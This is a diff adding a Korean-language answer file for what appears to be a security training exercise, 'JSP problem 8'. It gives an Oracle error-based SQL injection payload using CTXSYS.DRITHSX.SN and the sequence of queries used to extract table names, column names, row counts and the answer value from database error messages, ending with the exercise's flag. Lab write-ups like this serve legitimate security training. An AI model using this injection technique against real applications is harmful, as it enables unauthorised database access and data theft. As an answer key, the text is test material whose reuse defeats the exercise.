@@ -1,0 +1,53 @@
+JSP 8번 답안
+
+ee%' and 1=CTXSYS.DRITHSX.SN(user, (__공격쿼리__)) and '1%'='1
+
+
+1. 공격 과정 쿼리
+
+ 1) 테이블명 탈취
+
+select table_name from (select table_name, rownum as ln from user_tables) where ln = 5
+EQST_ANSWER
+
+2) 컬럼명 탈취
+
+select column_name from all_tab_columns where table_name = EQST_ANSWER
+
+에러코드 ### The error may exist in com/sec/infosec/board/dao/BbsDao7.xml
+칼럼 명 com/sec/infosec/board/dao
+
+2-1)칼럼개수 탈취
+
+select count(column_name) from all_tab_columns where table_name = EQST_ANSWER
+
+DRG-11701: thesaurus 5 does not exist
+
+칼럼 개수 5개
+
+2-2) 컬럼을 1row 씩 가져오기
+
+select column_name from (select column_name, rownum as ln from all_tab_columns where table_name = 'EQST_ANSWER') where ln = 1
+
+에러코드: DRG-11701: thesaurus ANSWER_COLUMN does not exist
+
+정답 칼럼: ANSWER_COLUMN 
+
+3) 데이터 탈취
+
+select ANSWER_COLUMN from EQST_ANSWER
+
+에러코드: thesaurus skinfosec_eqst_lms_system does not exist
+
+탈취 데이터: skinfosec_eqst_lms_system 
+
+4) 데이터의 개수
+
+select count(ANSWER_COLUMN) from EQST_ANSWER
+
+에러코드: DRG-11701: thesaurus 1 does not exist
+
+1개
+
+2. 정답
+skinfosec_eqst_lms_system 
